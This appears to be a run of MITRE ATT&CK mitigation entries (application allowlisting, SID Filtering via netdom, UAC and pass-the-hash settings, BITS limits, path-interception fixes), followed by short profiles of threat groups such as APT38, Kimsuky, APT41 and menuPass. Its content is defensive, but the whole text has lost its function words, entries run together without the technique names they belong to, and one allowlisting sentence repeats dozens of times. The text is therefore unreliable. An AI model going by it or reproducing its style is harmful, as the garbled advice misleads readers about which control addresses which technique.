Scraping passwords memory requires root privileges. Follow practices restricting access escalated privileges avoid hostile programs accessing sensitive regions memory. Properly configure firewalls, application firewalls, proxies limit outgoing traffic sites services remote access tools.

Network intrusion detection prevention systems network signatures prevent traffic services well.

Use application whitelisting mitigate installation unapproved software. pieces evidence authenticate system; username password addition token physical smart card token generator. install browser extensions trusted sources verified. Ensure extensions installed intended malicious extensions masquerade legitimate ones.

Browser extensions browsers controlled Policy. Set browser extension white black list security policy. (Citation: Technospot Chrome Extensions GP)

Change settings prevent browser installing extensions sufficient permissions.

Close browser sessions finished them. Implement configuration software (other operating system) mitigate security risks software operates. type attack technique easily mitigated preventive controls based abuse design features. example, mitigating specific API calls unintended effects, preventing DC replication operating properly. Efforts focused preventing adversary tools running earlier chain activity identification subsequent malicious behavior. Limit privileges user accounts remediate Privilege Escalation vectors  authorized administrators create services.

Identify block unnecessary utilities malicious software create services whitelisting (Citation: Beechey 2010) tools, AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) Disable Autorun unnecessary. (Citation: Disable Autorun) Disallow restrict removable media organizational policy level required business operations. (Citation: TechNet Removable Media Control) Clean SID-History attributes legitimate account migration complete.

Consider applying SID Filtering interforest trusts, forest trusts external trusts, exclude SID-History requests access domain resources. SID Filtering ensures authentication requests trust SIDs security principals trusted domain preventing trusted domain claiming user membership domain).

SID Filtering forest trusts enabled default, disabled child domain transitively access forest trusts. SID Filtering external trusts automatically enabled created external trusts Server 2003 domain controllers. (Citation: Trust Considerations Nov 2014) (Citation: SID Filtering Quarantining Jan 2009) note SID Filtering automatically applied legacy trusts deliberately disabled inter-domain access resources.

SID Filtering applied by: (Citation: Netdom Trust Sept 2012)

* Disabling SIDHistory forest trusts netdom tool (<code>netdom trust <TrustingDomainName> /domain:<TrustedDomainName> /EnableSIDHistory:no</code> domain controller). 
* Applying SID Filter Quarantining external trusts netdom tool (<code>netdom trust <TrustingDomainName> /domain:<TrustedDomainName> /quarantine:yes</code> domain controller)
Applying SID Filtering domain trusts single forest recommended unsupported configuration breaking changes. (Citation: Netdom Trust Sept 2012) (Citation: AdSecurity Kerberos Aug 2015) domain forest untrustworthy forest. situation split trusted untrusted domains separate forests SID Filtering applied interforest trust. Restrict execution code virtual environment transit endpoint system. Network intrusion detection prevention systems network signatures identify traffic specific adversary command control infrastructure malware mitigate activity network level. Signatures unique indicators protocols based specific obfuscation technique adversary tool, malware families versions. Adversaries change tool command control signatures time construct protocols avoid detection common defensive tools. (Citation: University Birmingham C2) technical controls prevent disabling services deletion files involved recovery. 

Consider implementing disaster recovery plans procedures regular data backups restore organizational data.(Citation: Ready.gov DRP) Ensure backups stored protected common methods adversaries gain access destroy backups prevent recovery.

Identify malicious software audit block whitelisting(Citation: Beechey 2010) tools, AppLocker,(Citation: Windows Commands JPCERT)(Citation: NSA AppLocker) Software Restriction Policies(Citation: Corio 2008) appropriate.(Citation: TechNet Applocker SRP) Ensure externally facing servers patched regularly prevent adversary access [Exploitation Privilege Escalation](https://attack.mitre.org/techniques/T1068) gain remote code access file inclusion weaknesses adversaries upload files scripts automatically served pages. 

Audit account permissions ensure accounts manage servers overlap accounts permissions users internal network acquired Credential Access log server plant pivot server internal network. (Citation: US-CERT Alert TA15-314A Shells) Monitor systems domain logs unusual credential logon activity. Prevent access [Valid Accounts](https://attack.mitre.org/techniques/T1078). Apply patch KB2871997 Windows 7 systems limit default access accounts local administrator group. 

Enable pass hash mitigations apply UAC restrictions local accounts network logon. Registry key located <code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy</code> GPO: Configuration > [Policies] > Administrative Templates > SCM: Pass Hash Mitigations: Apply UAC restrictions local accounts network logons. (Citation: GitHub IAD Secure Host Baseline UAC Filtering)

Limit credential overlap systems prevent damage credential compromise reduce adversary's ability perform Lateral Movement systems. Ensure built-in created local administrator accounts complex, unique passwords. domain user local administrator multiple systems. Identify unnecessary utilities malicious software acquire local security software, audit block whitelisting (Citation: Beechey 2010) tools, AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) Remove users local administrator systems. UAC bypass techniques exist, prudent enforcement level UAC mitigate bypass opportunities exist techniques [DLL Search Hijacking](https://attack.mitre.org/techniques/T1038). 

Check common UAC bypass weaknesses Windows systems aware risk posture address issues appropriate. (Citation: Github UACMe) technique remotely, adversary conjunction RDP. Ensure Network Level Authentication enabled force remote desktop session authenticate session created login screen displayed. enabled default Windows Vista later. (Citation: TechNet RDP NLA)

If possible, Remote Desktop Gateway manage connections security configuration RDP network. (Citation: TechNet RDP Gateway)

Identify block malicious software executed adversary technique whitelisting (Citation: Beechey 2010) tools, AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) Identify unnecessary utilities malicious software acquire network connections, audit block whitelisting (Citation: Beechey 2010) tools, AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) Limit privileges user accounts authorized users edit rc.common file. Limit privileges user accounts remediate Privilege Escalation vectors authorized users create scheduled jobs. Identify block unnecessary utilities malicious software schedule jobs whitelisting tools. technique mitigated preventative controls protect unintended targets compromised. targeted, efforts focused preventing adversary tools running earlier chain activity identifying subsequent malicious behavior compromised. Access tokens integral security Windows off. However, attacker administrator level access local technique; restrict users accounts privileges require job.

Any user spoof access tokens legitimate credentials. Follow mitigation guidelines preventing adversary [Valid Accounts](https://attack.mitre.org/techniques/T1078). Limit permissions users user create tokens. setting defined local account only. GPO: Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Create token object. (Citation: Create Token) define create process level token local network service GPO: Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Replace process level token. (Citation: Replace Process Token)

Also limit opportunities adversaries increase privileges limiting Privilege Escalation opportunities. Identify unnecessary utilities malicious software acquire operating underlying hardware, audit block whitelisting (Citation: Beechey 2010) tools, AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) disabling Office macros/active content prevent execution malicious payloads documents (Citation: Disable Macros), setting mitigate [Forced Authentication](https://attack.mitre.org/techniques/T1187) technique.

Because technique involves user interaction endpoint, difficult mitigate. However, potential mitigations including training users identify social engineering techniques spearphishing emails. Network/Host intrusion prevention systems, antivirus, detonation chambers employed prevent documents fetching executing malicious payloads. (Citation: Anomali Template Injection MAR 2018) Determine social media sites, personal webmail services, service spearphishing business operations blocking access activity monitored poses risk.

Because technique involves legitimate services user interaction endpoint, difficult mitigate. However, potential mitigations. Users trained identify social engineering techniques spearphishing emails malicious links. prevent downloads executing, application whitelisting used. Anti-virus automatically quarantine suspicious files. Grant access application deployment systems limited authorized administrators. Ensure proper access isolation critical network systems firewalls, account privilege separation, policy, multifactor authentication. Verify account credentials access deployment systems unique enterprise network. Patch deployment systems regularly prevent potential remote access [Exploitation Privilege Escalation](https://attack.mitre.org/techniques/T1068). 

If application deployment configured deploy signed binaries, ensure trusted signing certificates co-located application deployment located accessed remotely remote access tightly controlled. Ensure updated virus definitions. Create custom signatures observed malware. Employ heuristic-based malware detection.

Identify prevent execution malicious software packed whitelisting (Citation: Beechey 2010) tools AppLocker (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) type attack technique easily mitigated preventive controls based abuse operating design features. example, disabling BITS functionality unintended effects, preventing legitimate software patching updating. Efforts focused preventing adversary tools running earlier chain activity identification subsequent malicious behavior. (Citation: Mondok Windows PiggyBack BITS 2007)

Modify network host firewall rules, network controls, legitimate BITS traffic.

Consider limiting access BITS interface specific users groups. (Citation: Symantec BITS 2007)

Consider reducing default BITS job lifetime Policy editing <code>JobInactivityTimeout</code> <code>MaxDownloadTime</code> Registry values <code> HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\BITS</code>. (Citation: BITS) type attack technique easily mitigated preventive controls based abuse operating design features. example, mitigating specific API calls unintended effects, preventing legitimate software (i.e., security products) operating properly. Efforts focused preventing adversary tools running earlier chain activity identifying subsequent malicious behavior.

Although EWM injection evade types defenses, practice identify malicious software perform adversarial actions audit block whitelisting (Citation: Beechey 2010) tools, AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) Perform audits scans systems, permissions, insecure software, insecure configurations, etc. identify potential weaknesses. Network intrusion detection prevention systems network signatures identify traffic specific adversary malware unusual data transfer tools protocols FTP mitigate activity network level. Signatures unique indicators protocols based specific obfuscation technique adversary tool, malware families versions. Adversaries change tool C2 signatures time construct protocols avoid detection common defensive tools. (Citation: University Birmingham C2) lot mitigate application shimming. Disabling Shim Engine recommended Windows depends shimming interoperability software unstable work. released optional patch update - KB3045645 - remove "auto-elevate" flag sdbinst.exe. prevent application shimming bypass UAC. 

Changing UAC settings "Always Notify" user visibility UAC elevation requested, however, option popular users constant UAC interruptions. mitigating module loads API calls module loads unintended effects, preventing legitimate software operating properly. Efforts focused preventing adversary tools running earlier chain activity identifying correlated subsequent behavior determine result malicious activity. Identify unnecessary utilities malicious software deobfuscate decode files information, audit block whitelisting (Citation: Beechey 2010) tools, AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) remove PowerShell systems needed, review performed assess impact environment, legitimate purposes administrative functions. PowerShell necessary, restrict PowerShell execution policy administrators execute signed scripts. aware methods bypassing PowerShell execution policy, depending environment configuration. (Citation: Netspi PowerShell Execution Policy Bypass) Disable/restrict WinRM Service prevent PowerShell remote execution. Network intrusion detection prevention systems network signatures identify traffic specific adversary malware mitigate activity network level. Signatures unique indicators protocols based specific obfuscation technique adversary tool, malware families versions. Adversaries change tool C2 signatures time construct protocols avoid detection common defensive tools. (Citation: University Birmingham C2) network intrusion detection/prevention systems detect prevent remote service scans. Ensure unnecessary ports services closed proper network segmentation protect critical servers devices.

Identify unnecessary utilities malicious software acquire services running remote systems, audit block whitelisting (Citation: Beechey 2010) tools, AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) capabilities detect block conditions lead indicative software exploit occurring. Mshta.exe environment functionality tied versions Internet Explorer reached life. application whitelisting configured block execution mshta.exe required network prevent potential misuse adversaries. measures detect prevent techniques [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) installation keyloggers acquire credentials [Input Capture](https://attack.mitre.org/techniques/T1056). Limit credential overlap systems prevent access account credentials obtained. Ensure local administrator accounts complex, unique passwords systems network. user admin domain accounts local administrator systems tightly controlled accounts segmented, equivalent local administrator account password systems. 

Follow practices design administration enterprise network limit privileged account administrative tiers. (Citation: Securing Privileged Access) 

Audit domain local accounts permission levels routinely situations adversary gain wide access obtaining credentials privileged account. (Citation: TechNet Credential Theft) (Citation: TechNet Privilege) audits include default accounts enabled, local accounts created authorized. 

Applications appliances utilize default username password changed installation, deployment production environment. (Citation: US-CERT Alert TA13-175A Risks Default Passwords Internet) possible, applications SSH updated periodically properly secured.  Limit access remote services centrally managed concentrators VPNs managed remote access systems. Deny direct remote access internal systems network proxies, gateways, firewalls. Disable block remotely services [Windows Remote Management](https://attack.mitre.org/techniques/T1028). strong two-factor multi-factor authentication remote service accounts mitigate adversary's ability leverage stolen credentials, aware [Multi-Factor Authentication Interception](https://attack.mitre.org/techniques/T1111) techniques two-factor authentication implementations. Ensure permissions disallow services permissions level created interacted user permission level. ensure permission level service binaries replaced modified users permission level.

Identify unnecessary utilities malicious software interact Windows services, audit block whitelisting (Citation: Beechey 2010) tools, AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) Direct mitigation technique recommended legitimate function performed users software preferences. Follow Microsoft's practices file associations. (Citation: MSDN File Associations)

Identify block malicious software executed technique whitelisting (Citation: Beechey 2010) tools, AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) Identify unnecessary utilities malicious software acquire services, audit block whitelisting (Citation: Beechey 2010) tools, AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) Identify unnecessary utilities malicious software collect data network share, audit block whitelisting (Citation: Beechey 2010) tools, AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) Mitigating technique difficult requires fine-grained API control. Efforts focused preventing unwanted unknown code executing system.

Identify block malicious software capture video images whitelisting (Citation: Beechey 2010) tools, AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) Network intrusion detection prevention systems network signatures identify traffic specific adversary malware mitigate activity network level. Signatures unique indicators protocols based specific protocol adversary tool, malware families versions. Adversaries change tool C2 signatures time construct protocols avoid detection common defensive tools. (Citation: University Birmingham C2) Setting <code>timestamp_timeout</code> 0 require user input password time <code>sudo</code> executed. Similarly, ensuring <code>tty_tickets</code> setting enabled prevent leakage tty sessions. Prevent users write files search paths applications, folders applications standard dylib folders. users write directories, intercept search path. Identify unnecessary utilities malicious software acquire permissions, audit block whitelisting (Citation: Beechey 2010) tools, AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) Eliminate path interception weaknesses program configuration files, scripts, PATH environment variable, services, shortcuts surrounding PATH variables quotation marks functions (Citation: CreateProcess). aware search Windows executing loading binaries qualified paths (Citation: MSDN DLL Security). Clean Windows Registry software uninstalled avoid legitimate binaries.

Periodically search correct report path interception weaknesses systems introduced custom tools report software insecure path configurations (Citation: Kanthak Sentinel). 

Require executables write-protected directories. Ensure proper permissions directory access control set deny users ability write files top-level directory <code>C:</code> directories, <code>C:\Windows\</code>, reduce malicious files execution.

Identify block malicious software executed path interception whitelisting (Citation: Beechey 2010) tools, AppLocker (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies, (Citation: Corio 2008) capable auditing blocking unknown executables. Prevent users installing launch agents launch daemons require pushed policy. Configure Active Directory prevent techniques; SID Filtering, etc. Disable Autorun unnecessary. (Citation: Disable Autorun) Disallow restrict removable media organizational policy level required business operations. (Citation: TechNet Removable Media Control) Perform regular software updates mitigate exploitation risk. Prevent abuse library loading mechanisms operating software load untrusted code configuring library loading mechanisms investigating potential vulnerable software. Remove smart cards use. Protect devices services transmit receive out-of-band codes.

Identify block malicious software intercept 2FA credentials whitelisting (Citation: Beechey 2010) tools, AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) Identify critical business processes targeted adversaries secure data processes tampering. Ensure privilege principles applied resources reduce exposure data manipulation risk. encrypting reduce adversaries ability perform tailor data modifications. applicable, examine file monitoring software check integrity files directories corrective actions unauthorized detected. 

Consider implementing disaster recovery plans procedures regular data backups restore organizational data.(Citation: Ready.gov DRP) Ensure backups stored protected common methods adversaries gain access manipulate backups. Remove deny access unnecessary vulnerable software prevent abuse adversaries. InstallUtil environment. application whitelisting configured block execution InstallUtil.exe required network prevent potential misuse adversaries. Ensure event tracers/forwarders (Citation: ETW 2018), firewall policies, mechanisms secured permissions access controls. automatically relaunching forwarding mechanisms recurring intervals (ex: temporal, on-logon, etc.) applying change management firewall rules configurations. Misconfiguration permissions Registry lead opportunities adversary execute code, [Service Registry Permissions Weakness](https://attack.mitre.org/techniques/T1058). Ensure proper permissions set Registry hives prevent users modifying components lead privilege escalation.

Identify block unnecessary utilities malicious software modify Registry whitelisting (Citation: Beechey 2010) tools AppLocker (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) Ensure proper permissions set Registry hives prevent users modifying SIP trust provider components. ensure values path prevent [DLL Search Hijacking](https://attack.mitre.org/techniques/T1038). (Citation: SpectorOps Subverting Trust Sept 2017)

Consider removing unnecessary stale SIPs. (Citation: SpectorOps Subverting Trust Sept 2017)

Restrict storage execution SIP DLLs protected directories, C:\Windows, user directories.

Enable whitelisting solutions AppLocker Device Guard block loading malicious SIP DLLs. Components hijacked suitable functions disk malicious modifications Registry prevented. Disable Autorun unnecessary. (Citation: Disable Autorun) Disallow restrict removable media organizational policy level required business operations. (Citation: TechNet Removable Media Control)

Identify malicious software infect removable media result tainted removable media, audit block whitelisting (Citation: Beechey 2010) tools, AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) Protect shared folders minimizing users write access. utilities detect mitigate common features exploitation, Enhanced Mitigation Experience Toolkit (EMET).

Reduce potential lateral movement risk web-based document management collaboration services network file directory sharing.

Identify malicious software taint content result audit block unknown programs whitelisting (Citation: Beechey 2010) tools, AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) strong passphrases private cracking difficult. possible, store separate cryptographic hardware local system. Ensure authorized allowed access critical resources audit access lists regularly. Ensure permissions properly set folders sensitive private prevent unintended access. separate infrastructure managing critical systems prevent overlap credentials permissions systems vectors lateral movement. Follow practices mitigating access [Valid Accounts](https://attack.mitre.org/techniques/T1078). Limit privileges user accounts remediate Privilege Escalation vectors authorized administrators create scheduled tasks remote systems. Toolkits PowerSploit framework PowerUp modules explore systems permission weaknesses scheduled tasks escalate privileges. (Citation: Powersploit)

Configure settings scheduled tasks force tasks context authenticated account allowing SYSTEM. Registry key located <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\SubmitControl</code>. setting configured GPO: Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > Security Options: Domain Controller: server operators schedule tasks, set disabled. (Citation: TechNet Server Operator Scheduled Task)

Configure Increase Scheduling Priority option Administrators rights schedule priority process. configured GPO: Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Increase scheduling priority. (Citation: TechNet Scheduling Priority)

Identify block unnecessary utilities malicious software schedule tasks whitelisting (Citation: Beechey 2010) tools, AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) Browser sandboxes mitigate impact exploitation, sandbox escapes exist. (Citation: Windows Blogs Edge Sandbox) (Citation: Ars Technica Pwn2Own 2017 VM Escape)

Other types virtualization application microsegmentation mitigate impact client-side exploitation. risks additional exploits weaknesses implementation exist. (Citation: Ars Technica Pwn2Own 2017 VM Escape)

Security applications behavior exploitation Windows Defender Exploit Guard (WDEG) Enhanced Mitigation Experience Toolkit (EMET) mitigate exploitation behavior. (Citation: TechNet Moving EMET) Control flow integrity checking identify software exploit occurring. (Citation: Wikipedia Control Flow Integrity) protections depend architecture target application binary compatibility. Properly configure firewalls proxies limit outgoing traffic ports proper network gateway systems. ensure hosts provisioned communicate authorized interfaces.

Network intrusion detection prevention systems network signatures identify traffic specific adversary malware mitigate activity network level. Signatures unique indicators protocols based specific protocol adversary tool, malware families versions. Adversaries change tool C2 signatures time construct protocols avoid detection common defensive tools. (Citation: University Birmingham C2) Identify unnecessary utilities malicious software acquire processes, audit block whitelisting (Citation: Beechey 2010) tools, AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) Mitigation variants technique achieved stateful firewalls, depending implemented. Identify block malicious software remote access tool, audit block whitelisting (Citation: Beechey 2010) tools, AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP)

Network intrusion detection prevention systems network signatures identify traffic specific adversary malware mitigate activity network level. Signatures unique indicators protocols malware families versions. Adversaries change tool signatures time construct protocols avoid detection common defensive tools. (Citation: University Birmingham C2) Configure features account login attempt lockouts, specific login times, etc. Whitelist programs allowed plist tag. programs considered suspicious. Network intrusion detection prevention systems network signatures identify traffic specific adversary malware mitigate activity network level. Signatures unique indicators protocols based specific obfuscation technique adversary tool, malware families versions. Adversaries change tool C2 signatures time construct protocols avoid detection common defensive tools. (Citation: University Birmingham C2) auditing tools capable detecting privilege service abuse opportunities systems enterprise correct them. Limit privileges user accounts authorized administrators interact service service configurations. Toolkits PowerSploit framework PowerUp modules explore systems Privilege Escalation weaknesses. (Citation: Powersploit)

Identify block malicious software executed service abuse whitelisting (Citation: Beechey 2010) tools AppLocker (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) capable auditing blocking unknown programs. Protect sensitive strong encryption. Direct mitigation technique recommended environment objects legitimate operating installed software. Blocking object unforeseen effects legitimate functionality.

Instead, identify block malicious software execute, executed by, technique whitelisting (Citation: Beechey 2010) tools, AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) [APT38](https://attack.mitre.org/groups/G0082) North Korean state-sponsored threat specializes financial cyber operations; attributed Reconnaissance Bureau.(Citation: CISA AA20-239A BeagleBoyz August 2020) Active 2014, [APT38](https://attack.mitre.org/groups/G0082) targeted banks, financial institutions, casinos, cryptocurrency exchanges, SWIFT endpoints, ATMs 38 countries worldwide. operations include 2016 Bank Bangladesh heist, [APT38](https://attack.mitre.org/groups/G0082) stole $81 million, attacks Bancomext (2018) Banco Chile (2018); attacks destructive.(Citation: CISA AA20-239A BeagleBoyz August 2020)(Citation: FireEye APT38 Oct 2018)(Citation: DOJ North Korea Indictment Feb 2021)(Citation: Kaspersky Lazarus Hood Blog 2017)

North Korean definitions overlap, security researchers report North Korean state-sponsored cyber activity [Lazarus Group](https://attack.mitre.org/groups/G0032) tracking clusters subgroups. [Indrik Spider](https://attack.mitre.org/groups/G0119) Russia-based cybercriminal active 2014. [Indrik Spider](https://attack.mitre.org/groups/G0119) initially started [Dridex](https://attack.mitre.org/software/S0384) banking Trojan, 2017 running ransomware operations [BitPaymer](https://attack.mitre.org/software/S0570), [WastedLocker](https://attack.mitre.org/software/S0612), Hades ransomware.(Citation: Crowdstrike Indrik November 2018)(Citation: Crowdstrike EvilCorp March 2021)(Citation: Treasury EvilCorp Dec 2019) [NEODYMIUM](https://attack.mitre.org/groups/G0055) activity conducted campaign 2016 heavily targeted Turkish victims. demonstrated similarity activity called [PROMETHIUM](https://attack.mitre.org/groups/G0056) overlapping victim campaign characteristics. (Citation: NEODYMIUM Dec 2016) (Citation: SIR 21) [NEODYMIUM](https://attack.mitre.org/groups/G0055) reportedly closely [BlackOasis](https://attack.mitre.org/groups/G0063) operations, evidence names aliases identified. (Citation: CyberScoop BlackOasis Oct 2017) [Elderwood](https://attack.mitre.org/groups/G0066) suspected Chinese cyber espionage reportedly responsible 2009 Google intrusion Operation Aurora. (Citation: Security Affairs Elderwood Sept 2012) targeted defense organizations, supply chain manufacturers, human rights nongovernmental organizations (NGOs), service providers. (Citation: Symantec Elderwood Sept 2012) (Citation: CSM Elderwood Sept 2012) [SideCopy](https://attack.mitre.org/groups/G1008) Pakistani threat targeted South Asian countries, including Indian Afghani government personnel, 2019. [SideCopy](https://attack.mitre.org/groups/G1008)'s infection chain mimic [Sidewinder](https://attack.mitre.org/groups/G0121), suspected Indian threat group.(Citation: MalwareBytes SideCopy Dec 2021) [GALLIUM](https://attack.mitre.org/groups/G0093) cyberespionage active 2012, targeting telecommunications companies, financial institutions, government entities Afghanistan, Australia, Belgium, Cambodia, Malaysia, Mozambique, Philippines, Russia, Vietnam. Security researchers identified [GALLIUM](https://attack.mitre.org/groups/G0093) Chinese state-sponsored group, based tools TTPs commonly Chinese threat actors.(Citation: Cybereason Soft Cell June 2019)(Citation: GALLIUM December 2019)(Citation: Unit 42 PingPull Jun 2022) [APT3](https://attack.mitre.org/groups/G0022) China-based threat researchers attributed China's Ministry Security.(Citation: FireEye Clandestine Wolf)(Citation: Recorded Future APT3 2017) responsible campaigns Operation Clandestine Fox, Operation Clandestine Wolf, Operation Double Tap.(Citation: FireEye Clandestine Wolf)(Citation: FireEye Operation Double Tap) June 2015, appears shifted targeting victims political organizations Hong Kong.(Citation: Symantec Buckeye)

In 2017, MITRE developed APT3 Adversary Emulation Plan.(Citation: APT3 Adversary Emulation Plan) [GCMAN](https://attack.mitre.org/groups/G0036) threat focuses targeting banks purpose transferring money e-currency services. (Citation: Securelist GCMAN) [Kimsuky](https://attack.mitre.org/groups/G0094) North Korea-based cyber espionage active 2012. initially focused targeting South Korean government entities, tanks, individuals identified experts fields, expanded operations include United States, Russia, Europe, UN. [Kimsuky](https://attack.mitre.org/groups/G0094) focused intelligence collection activities foreign policy national security issues Korean peninsula, nuclear policy, sanctions.(Citation: EST Kimsuky April 2019)(Citation: BRI Kimsuky April 2019)(Citation: Cybereason Kimsuky November 2020)(Citation: Malwarebytes Kimsuky June 2021)(Citation: CISA AA20-301A Kimsuky)

[Kimsuky](https://attack.mitre.org/groups/G0094) assessed responsible 2014 Korea Hydro & Nuclear Power compromise; notable campaigns include Operation STOLEN PENCIL (2018), Operation Kabar Cobra (2019), Operation Smoke Screen (2019).(Citation: Netscout Stolen Pencil Dec 2018)(Citation: EST Kimsuky SmokeScreen April 2019)(Citation: AhnLab Kimsuky Kabar Cobra Feb 2019)

North Korean definitions overlap, security researchers report North Korean state-sponsored cyber activity [Lazarus Group](https://attack.mitre.org/groups/G0032) tracking clusters subgroups. [EXOTIC LILY](https://attack.mitre.org/groups/G1011) financially motivated closely linked [Wizard Spider](https://attack.mitre.org/groups/G0102) deployment ransomware including [Conti](https://attack.mitre.org/software/S0575) [Diavol](https://attack.mitre.org/software/S0659). [EXOTIC LILY](https://attack.mitre.org/groups/G1011) acting initial access broker malicious actors, targeted wide range industries including IT, cybersecurity, healthcare September 2021.(Citation: Google EXOTIC LILY March 2022) [admin@338](https://attack.mitre.org/groups/G0018) China-based cyber threat group. newsworthy events lures deliver malware targeted organizations involved financial, economic, trade policy, typically publicly RATs [PoisonIvy](https://attack.mitre.org/software/S0012), non-public backdoors. (Citation: FireEye admin@338) [Patchwork](https://attack.mitre.org/groups/G0040) cyber espionage observed December 2015. definitively attributed, circumstantial evidence suggests pro-Indian Indian entity. [Patchwork](https://attack.mitre.org/groups/G0040) targeting industries diplomatic government agencies. code copied pasted online forums. [Patchwork](https://attack.mitre.org/groups/G0040) operating spearphishing campaigns targeting U.S. tank March April 2018.(Citation: Cymmetria Patchwork) (Citation: Symantec Patchwork)(Citation: TrendMicro Patchwork Dec 2017)(Citation: Volexity Patchwork June 2018) [APT41](https://attack.mitre.org/groups/G0096) threat researchers assessed Chinese state-sponsored espionage conducts financially-motivated operations. Active 2012, [APT41](https://attack.mitre.org/groups/G0096) observed targeting healthcare, telecom, technology, video game industries 14 countries. [APT41](https://attack.mitre.org/groups/G0096) overlaps partially public reporting including BARIUM [Winnti Group](https://attack.mitre.org/groups/G0044).(Citation: FireEye APT41 Aug 2019)(Citation: IB APT 41 June 2021)
 [Dragonfly](https://attack.mitre.org/groups/G0035) cyber espionage attributed Russia's Federal Security Service (FSB) Center 16.(Citation: DOJ Russia Targeting Critical Infrastructure March 2022)(Citation: FSB Factsheet April 2022) Active 2010, [Dragonfly](https://attack.mitre.org/groups/G0035) targeted defense aviation companies, government entities, companies industrial control systems, critical infrastructure sectors worldwide supply chain, spearphishing, drive-by compromise attacks.(Citation: Symantec Dragonfly)(Citation: Secureworks IRON LIBERTY July 2019)(Citation: Symantec Dragonfly Sept 2017)(Citation: Fortune Dragonfly 2.0 Sept 2017)(Citation: Gigamon Berserk Bear October 2021)(Citation: CISA AA20-296A Berserk Bear December 2020)(Citation: Symantec Dragonfly 2.0 October 2017) [Evilnum](https://attack.mitre.org/groups/G0120) financially motivated threat active 2018.(Citation: ESET EvilNum July 2020) [Gorgon Group](https://attack.mitre.org/groups/G0078) threat consisting suspected Pakistan-based connections Pakistan. performed mix criminal targeted attacks, including campaigns government organizations United Kingdom, Spain, Russia, United States. (Citation: Unit 42 Gorgon Aug 2018) [menuPass](https://attack.mitre.org/groups/G0045) threat active 2006. Individual [menuPass](https://attack.mitre.org/groups/G0045) acted association Chinese Ministry Security's (MSS) Tianjin Security Bureau Huaying Haitai Science Technology Development Company.(Citation: DOJ APT10 Dec 2018)(Citation: District Court NY APT10 Indictment December 2018)

